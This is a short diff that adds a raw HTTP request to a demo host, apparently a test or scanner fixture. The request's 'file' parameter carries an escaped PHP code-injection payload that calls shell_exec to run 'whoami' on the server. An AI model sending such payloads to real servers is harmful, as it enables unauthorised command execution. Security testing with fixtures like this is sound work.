@@ -1,0 +1,4 @@
+GET /a?file=x%3Dshell_exec(\u0022whoami\u0022)\u003B HTTP/1.1
+Host: demo.example.com
+Connection: close
+
